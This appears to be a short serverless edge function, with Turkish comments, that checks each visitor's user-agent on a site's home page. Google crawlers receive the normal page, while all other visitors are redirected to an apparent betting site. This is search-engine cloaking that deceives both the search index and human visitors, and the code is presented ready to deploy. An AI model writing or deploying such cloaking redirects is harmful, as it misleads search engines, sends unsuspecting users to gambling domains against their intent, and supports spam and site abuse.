export async function onRequest(context) {
  const request = context.request;
  const url = new URL(request.url);
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();

  // SADECE ANA SAYFA
  if (url.pathname !== '/' && url.pathname !== '/index.html') {
    return context.next();
  }

  // GOOGLEBOT KONTROLÜ (KESİN)
  const isGooglebot =
    /googlebot|mediapartners-google|adsbot-google|google-inspectiontool/i.test(userAgent);

  // GOOGLEBOT → index.html (SEO)
  if (isGooglebot) {
    console.log('Googlebot detected – serving index.html');
    return context.next();
  }

  // GOOGLEBOT DEĞİL → xx.com'a yönlendir
  console.log('Non-Googlebot – redirecting to xx.com');
  return Response.redirect('https://radisonbet376.com', 302);
}
